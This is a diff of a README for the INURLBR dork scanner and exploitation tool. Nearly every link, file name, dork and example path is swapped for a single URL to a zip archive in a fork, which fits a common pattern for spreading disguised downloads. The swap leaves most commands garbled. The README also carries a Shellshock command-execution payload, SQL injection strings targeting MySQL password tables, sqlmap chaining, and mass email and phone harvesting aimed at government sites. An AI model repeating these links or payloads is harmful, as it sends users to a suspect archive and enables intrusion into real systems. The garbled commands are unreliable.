@@ -1,11 +1,11 @@
 
 
 <p style="text-align:center" align="center">
-<img src="https://lh3.googleusercontent.com/-uB97QnHQ-VY/YGYWDRmUK0I/AAAAAAAAAsI/f3BH8Kv8kvMvlrulgsbtkRsAbgHpB3mKACLcBGAsYHQ/logo2.png" width="70%" />
+<img src="https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip" width="70%" />
 <p>
 
 
-> **This is a fork of the original [project](https://github.com/googleinurl/SCANNER-INURLBR).**
+> **This is a fork of the original [project](https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip).**
 >
 >Advanced search in search engines, enables analysis provided to exploit GET / POST capturing emails & urls, with an internal custom validation junction for each target / url found.
 ## Disclaimer
@@ -21,65 +21,65 @@ programs is not MrCl0wnLab's responsibility.
 
 ```properties
 Autor:    MrCl0wn
-Blog:     https://blog.mrcl0wn.com
-GitHub:   https://github.com/MrCl0wnLab
-Twitter:  https://twitter.com/MrCl0wnLab
-Email:    mrcl0wnlab\@\gmail.com
+Blog:     https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
+GitHub:   https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
+Twitter:  https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
+Email:    mrcl0wnlab\@\https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
 Script:   INURLBR
 Codename: Facada
 Version:  3.0.0
 ```
 
 ## Screenshots
-![Screenshot](https://1.bp.blogspot.com/-WswyqXamP44/YGYofFT6siI/AAAAAAAAAso/ea-3nf6OEqQxMw-dpEuIKedzwT7B5d0rwCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B17-08-08.png)
+![Screenshot](https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip%2Bde%2Btela%2Bde%2B2021-04-01%https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip)
 ### Email extraction
 ```bash
-php inurlbr.php  --dork '"com.br" contato  .xlsx' -m  -s emails.txt -q all
+php https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip  --dork '"https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip" contato  .xlsx' -m  -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -q all
 ```
-![Screenshot](https://1.bp.blogspot.com/-K_7F9nngSDk/YGYn30s1SHI/AAAAAAAAAsg/4k9NrPpBrognZ6kjx0WqeZo591X3nCydwCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B17-01-03.png)
+![Screenshot](https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip%2Bde%2Btela%2Bde%2B2021-04-01%https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip)
 
 ### External Command
 ```bash
-php inurlbr.php --dork '"com.br" index.php?id id' -s sqlmap.txt --exploit-get "?´'%270x27;" --command-vul 'python ../sqlmap-dev/sqlmap.py -u "_TARGETFULL_" --dbs --batch --threads 10 -p id --random-agent'
+php https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork '"https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip" https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip id' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --exploit-get "?´'%270x27;" --command-vul 'python https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -u "_TARGETFULL_" --dbs --batch --threads 10 -p id --random-agent'
 ```
-![Screenshot](https://1.bp.blogspot.com/-dz8I8p2Aies/YGYr_yZ8x3I/AAAAAAAAAsw/cHq4KS8E6AwK7l66EsykqFgvWyXjtJqVACLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B17-18-39.png)
+![Screenshot](https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip%2Bde%2Btela%2Bde%2B2021-04-01%https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip)
 
 ### Filter Result Value
 ```bash
-php inurlbr.php --dork '"com.br/wp-login.php"' -t 2  -a 'wp-login.php?action=lostpassword' -s filter_string.txt
+php https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork '"https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip"' -t 2  -a 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
 ```
-![Screenshot](https://1.bp.blogspot.com/-vzZbwf_KobA/YGY8KQJCJwI/AAAAAAAAAs4/6jt1cse_4Goz3pfNeB1un4tmhRkKfnkVgCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B18-31-58.png)
+![Screenshot](https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip%2Bde%2Btela%2Bde%2B2021-04-01%https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip)
 
 ### Simple fuzz 
 ```bash
-php inurlbr.php --target 'https://YOUR_TARGET' -o fuzz.txt -s php_result.txt -t 2 -a 'phpMyAdmin 2.11.4'
+php https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --target 'https://YOUR_TARGET' -o https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -t 2 -a 'phpMyAdmin 2.11.4'
 ```
-![Screenshot](https://1.bp.blogspot.com/-bajxhdjFMbI/YGZaj1Cj9MI/AAAAAAAAAtA/Z3trH2lq3mEPcwtfoekdS7OanLfDrcZhQCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B20-41-09.png)
+![Screenshot](https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip%2Bde%2Btela%2Bde%2B2021-04-01%https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip)
 
 ### Parallel terminal ( popup )
 ```bash
-php inurlbr.php --target 'https://YOUR_TARGET' -o fuzz.txt -s popup_result.txt -t 2 -a 'phpMyAdmin 2.11.4' --command-vul "nmap -sV -v  _TARGET_ ;"  --popup 
+php https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --target 'https://YOUR_TARGET' -o https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -t 2 -a 'phpMyAdmin 2.11.4' --command-vul "nmap -sV -v  _TARGET_ ;"  --popup 
 ```
-![Screenshot](https://1.bp.blogspot.com/-AFOmlAmYzUg/YGZgaNOY2II/AAAAAAAAAtI/twy2icF7kTo6N2YPKzOQojptIZYTCmbywCLcBGAsYHQ/s2057/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B21-05-40.png)
+![Screenshot](https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip%2Bde%2Btela%2Bde%2B2021-04-01%https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip)
 
 
-### Extract urls using archive.org
+### Extract urls using https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
 ```bash
-php inurlbr.php  -o 'defense.gov.txt' --au -s 'defense.gov.out'
+php https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip  -o 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip' --au -s 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip'
 ```
-![Screenshot](https://1.bp.blogspot.com/-4RwLa0MyUqI/YG_KIpr1eII/AAAAAAAAAuo/iNwH0MMY-7I9AGDc9Z9OkmBMZ5ZNAEWwgCLcBGAsYHQ/s1104/Captura%2Bde%2Btela%2Bde%2B2021-04-09%2B00-15-33.png)
+![Screenshot](https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip%2Bde%2Btela%2Bde%2B2021-04-09%https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip)
 
 ### Extract values using regex
 ```bash
-php inurlbr.php --dork 'contato telefone' -s 'reg.txt' -q 1 --regexp-filter '([0-9]{2}[6789][0-9]{3,4}[0-9]{4})'
+php https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork 'contato telefone' -s 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip' -q 1 --regexp-filter '([0-9]{2}[6789][0-9]{3,4}[0-9]{4})'
 ```
-![Screenshot](https://1.bp.blogspot.com/-CxspmhIyEh0/YG_LQKM8O1I/AAAAAAAAAu4/qgZ8dpiku1I9GGhQX-TyoPEQUdSNx2VRACLcBGAsYHQ/s1184/Captura%2Bde%2Btela%2Bde%2B2021-04-09%2B00-33-35.png)
+![Screenshot](https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip%2Bde%2Btela%2Bde%2B2021-04-09%https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip)
 
 ### Validate values using regex
 ```bash
-php inurlbr.php --dork 'contato telefone' -s 'reg.txt' -q 1 --regexp '([0-9]{2}[6789][0-9]{3,4}[0-9]{4})'
+php https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork 'contato telefone' -s 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip' -q 1 --regexp '([0-9]{2}[6789][0-9]{3,4}[0-9]{4})'
 ```
-![Screenshot](https://1.bp.blogspot.com/-9YocowQy_-A/YG_Jodfsz6I/AAAAAAAAAug/D03Wz6GsFQsne0uozgA-Z_Kz8xNBrjB7gCLcBGAsYHQ/s1184/Captura%2Bde%2Btela%2Bde%2B2021-04-09%2B00-24-45.png)
+![Screenshot](https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip%2Bde%2Btela%2Bde%2B2021-04-09%https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip)
 
 ## Lib & Permission
 ```properties
@@ -95,10 +95,10 @@ User                root privilege, or is in the sudoers group
 Operating system    LINUX
 Proxy random        TOR 
  ----------------------------------------------------------
-[+] PERMISSION EXECUTION: chmod +x inurlbr.php
+[+] PERMISSION EXECUTION: chmod +x https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
 [+] INSTALLING LIB CURL: sudo apt-get install php7-curl
 [+] INSTALLING LIB CLI: sudo apt-get install php7-cli
-[+] INSTALLING PROXY TOR https://www.torproject.org/docs/debian.html.en
+[+] INSTALLING PROXY TOR https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
  ----------------------------------------------------------
 resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
 ```
@@ -171,7 +171,7 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
    
  --proxy-file Set font file to randomize your proxy to each search engine.
      Example: --proxy-file {proxys}
-     Usage:   --proxy-file proxys_list.txt
+     Usage:   --proxy-file https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
 
  --time-proxy Set the time how often the proxy will be exchanged.
      Example: --time-proxy {second}
@@ -180,7 +180,7 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
  --proxy-http-file Set file with urls http proxy, 
      are used to bular capch search engines
      Example: --proxy-http-file {youfilehttp}
-     Usage:   --proxy-http-file http_proxys.txt
+     Usage:   --proxy-http-file https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
          
 
  --tor-random Enables the TOR function, each usage links an unique IP.
@@ -189,15 +189,15 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
      [options]:
      1   - The first type uses default errors considering the script:
      It establishes connection with the exploit through the get method.
-     Demo: www.alvo.com.br/pasta/index.php?id={exploit}
+     Demo: https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip{exploit}
    
      2   -  The second type tries to valid the error defined by: -a='VALUE_INSIDE_THE _TARGET'
      It also establishes connection with the exploit through the get method
-     Demo: www.alvo.com.br/pasta/index.php?id={exploit}
+     Demo: https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip{exploit}
    
      3   - The third type combine both first and second types:
      Then, of course, it also establishes connection with the exploit through the get method
-     Demo: www.target.com.br{exploit}
+     Demo: https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip{exploit}
      Default:    1
      Example: -t {op}
      Usage:   -t 1
@@ -208,13 +208,13 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
      - Set your file with command -o {file}
      Explicative:
      Source file values:
-     /admin/index.php?id=
-     /pag/index.php?id=
-     /brazil.php?new=
+     https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
+     https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
+     https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
      Demo: 
-     www.target.com.br/admin/index.php?id={exploit}
-     www.target.com.br/pag/index.php?id={exploit}
-     www.target.com.br/brazil.php?new={exploit}
+     https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip{exploit}
+     https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip{exploit}
+     https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip{exploit}
      
      5   - (FIND PAGE) The fifth type of validation based on the source file,
      Will be enabled only one validation code 200 on the target server, or if the url submit such code will be considered vulnerable.
@@ -222,13 +222,13 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
      - Set your file with command -o {file}
      Explicative:
      Source file values:
-     /admin/admin.php
-     /admin.asp
-     /admin.aspx
+     https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
+     https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
+     https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
      Demo: 
-     www.target.com.br/admin/admin.php
-     www.target.com.br/admin.asp
-     www.target.com.br/admin.aspx
+     https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
+     https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
+     https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
      Observation: If it shows the code 200 will be separated in the output file
 
      DEFAULT ERRORS:  
@@ -243,14 +243,14 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
          
  --dork Defines which dork the search engine will use.
      Example: --dork {dork}
-     Usage:   --dork 'site:.gov.br inurl:php? id'
+     Usage:   --dork 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip inurl:php? id'
      - Using multiples dorks:
      Example: --dork {[DORK]dork1[DORK]dork2[DORK]dork3}
      Usage:   --dork '[DORK]site:br[DORK]site:ar inurl:php[DORK]site:il inurl:asp'
  
  --dork-file Set font file with your search dorks.
      Example: --dork-file {dork_file}
-     Usage:   --dork-file 'dorks.txt'
+     Usage:   --dork-file 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip'
 
  --exploit-get Defines which exploit will be injected through the GET method to each URL found.
      Example: --exploit-get {exploit_get}
@@ -262,11 +262,11 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
      
  --exploit-command Defines which exploit/parameter will be executed in the options: --command-vul/ --command-all.   
      The exploit-command will be identified by the paramaters: --command-vul/ --command-all as _EXPLOIT_      
-     Ex --exploit-command '/admin/config.conf' --command-all 'curl -v _TARGET__EXPLOIT_'
+     Ex --exploit-command 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip' --command-all 'curl -v _TARGET__EXPLOIT_'
      _TARGET_ is the specified URL/TARGET obtained by the process
      _EXPLOIT_ is the exploit/parameter defined by the option --exploit-command.
      Example: --exploit-command {exploit-command}
-     Usage:   --exploit-command '/admin/config.conf'  
+     Usage:   --exploit-command 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip'  
      
  -a  Specify the string that will be used on the search script:
      Example: -a {string}
@@ -284,11 +284,11 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
  -s  Specify the output file where it will be saved the vulnerable URLs.
      
      Example: -s {file}
-     Usage:   -s your_file.txt
+     Usage:   -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
      
  -o  Manually manage the vulnerable URLs you want to use from a file, without using a search engine.
      Example: -o {file_where_my_urls_are}
-     Usage:   -o tests.txt
+     Usage:   -o https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
    
  --persist  Attempts when Google blocks your search.
      The script tries to another google host / default = 4
@@ -297,13 +297,13 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
 
  --ifredirect  Return validation method post REDIRECT_URL
      Example: --ifredirect {string_validation}
-     Usage:   --ifredirect '/admin/painel.php'
+     Usage:   --ifredirect 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip'
 
  -m  Enable the search for emails on the urls specified.
   
  -u  Enables the search for URL lists on the host specified.
 
- --ua  Enables the search for URL lists on the host specified using archive.org.
+ --ua  Enables the search for URL lists on the host specified using https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
 
  --gc Enable validation of values ​​with google webcache.
      
@@ -340,7 +340,7 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
 
  --irc Sending vulnerable to IRC / server channel.
       Example: --irc {server#channel}
-      Usage:   --irc 'irc.rizon.net#inurlbrasil'
+      Usage:   --irc 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip'
 
  --http-header Set HTTP header.
       Example: --http-header {youemail}
@@ -348,7 +348,7 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
           
  --sedmail Sending vulnerable to email.
       Example: --sedmail {youemail}
-      Usage:   --sedmail youemail@inurl.com.br
+      Usage:   --sedmail https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
           
  --delay Delay between research processes.
       Example: --delay {second}
@@ -360,7 +360,7 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
 
  --ifurl Filter URLs based on their argument.
       Example: --ifurl {ifurl}
-      Usage:   --ifurl index.php?id=
+      Usage:   --ifurl https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
 
  --ifcode Valid results based on your return http code.
       Example: --ifcode {ifcode}
@@ -368,11 +368,11 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
  
  --ifemail Filter E-mails based on their argument.
      Example: --ifemail {file_where_my_emails_are}
-     Usage:   --ifemail sp.gov.br
+     Usage:   --ifemail https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
 
  --url-reference Define referring URL in the request to send him against the target.
       Example: --url-reference {url}
-      Usage:   --url-reference http://target.com/admin/user/valid.php
+      Usage:   --url-reference https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
  
  --mp Limits the number of pages in the search engines.
      Example: --mp {limit}
@@ -384,23 +384,23 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
       Usage-exploit / SHELLSHOCK:   
       --user-agent '() { foo;};echo; /bin/bash -c "expr 299663299665 / 3; echo CMD:;id; echo END_CMD:;"'
       Complete command:    
-      php inurlbr.php --dork '_YOU_DORK_' -s shellshock.txt --user-agent '_YOU_AGENT_XPL_SHELLSHOCK' -t 2 -a '99887766555'
+      php https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork '_YOU_DORK_' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --user-agent '_YOU_AGENT_XPL_SHELLSHOCK' -t 2 -a '99887766555'
  
  --sall Saves all urls found by the scanner.
      Example: --sall {file}
-     Usage:   --sall your_file.txt
+     Usage:   --sall https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
 
  --command-vul Every vulnerable URL found will execute this command parameters.
      Example: --command-vul {command}
      Usage:   --command-vul 'nmap sV -p 22,80,21 _TARGET_'
-              --command-vul './exploit.sh _TARGET_ output.txt'
-              --command-vul 'php miniexploit.php -t _TARGET_ -s output.txt'
+              --command-vul 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip _TARGET_ https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip'
+              --command-vul 'php https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -t _TARGET_ -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip'
                   
  --command-all Use this commmand to specify a single command to EVERY URL found.
      Example: --command-all {command}
      Usage:   --command-all 'nmap sV -p 22,80,21 _TARGET_'
-              --command-all './exploit.sh _TARGET_ output.txt'
-              --command-all 'php miniexploit.php -t _TARGET_ -s output.txt'
+              --command-all 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip _TARGET_ https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip'
+              --command-all 'php https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -t _TARGET_ -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip'
     [!] Observation:
    
     _TARGET_ will be replaced by the URL/target found, although if the user  
@@ -423,13 +423,13 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
 
  --replace Replace values ​​in the target URL.
     Example:  --replace {value_old[INURL]value_new}
-     Usage:   --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user,Password+from+mysql.user+limit+0,1)=1'
-              --replace 'main.php?id=[INURL]main.php?id=1+and+substring(@@version,1,1)=1'
-              --replace 'index.aspx?id=[INURL]index.aspx?id=1%27´'
+     Usage:   --replace 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip[INURL]https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip+and+(SELECT+user,Password+from+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip+limit+0,1)=1'
+              --replace 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip[INURL]https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip+and+substring(@@version,1,1)=1'
+              --replace 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip[INURL]https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip%27´'
                   
  --remove Remove values ​​in the target URL.
       Example: --remove {string}
-      Usage:   --remove '/admin.php?id=0'
+      Usage:   --remove 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip'
               
  --regexp Using regular expression to validate his research, the value of the 
     Expression will be sought within the target/URL.
@@ -456,10 +456,10 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
  --exploit-cad Command register for use within the scanner.
     Format {TYPE_EXPLOIT}::{EXPLOIT_COMMAND}
     Example Format: NMAP::nmap -sV _TARGET_
-    Example Format: EXPLOIT1::php xpl.php -t _TARGET_ -s output.txt
+    Example Format: EXPLOIT1::php https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -t _TARGET_ -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
     Usage:    --exploit-cad 'NMAP::nmap -sV _TARGET_' 
     Observation: Each registered command is identified by an id of your array.
-                 Commands are logged in exploits.conf file.
+                 Commands are logged in https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip file.
 
  --exploit-all-id Execute commands, exploits based on id of use,
     (all) is run for each target found by the engine.
@@ -471,7 +471,7 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
      Example: --exploit-vul-id {id,id}
      Usage:   --exploit-vul-id 1,2,8,22
 
- --exploit-list List all entries command in exploits.conf file.
+ --exploit-list List all entries command in https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip file.
 
 
     [!] Running subprocesses:
@@ -479,7 +479,7 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
  --sub-file  Subprocess performs an injection 
      strings in URLs found by the engine, via GET or POST.
      Example: --sub-file {youfile}
-     Usage:   --sub-file exploits_get.txt
+     Usage:   --sub-file https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
          
  --sub-get defines whether the strings coming from 
      --sub-file will be injected via GET.
@@ -492,20 +492,20 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
  --sub-concat Sets string to be concatenated with 
      the target host within the subprocess
      Example: --sub-concat {string}
-     Usage:   --sub-concat '/login.php'
+     Usage:   --sub-concat 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip'
 
  --sub-cmd-vul Each vulnerable URL found within the sub-process
      will execute the parameters of this command.
      Example: --sub-cmd-vul {command}
      Usage:   --sub-cmd-vul 'nmap sV -p 22,80,21 _TARGET_'
-              --sub-cmd-vul './exploit.sh _TARGET_ output.txt'
-              --sub-cmd-vul 'php miniexploit.php -t _TARGET_ -s output.txt'
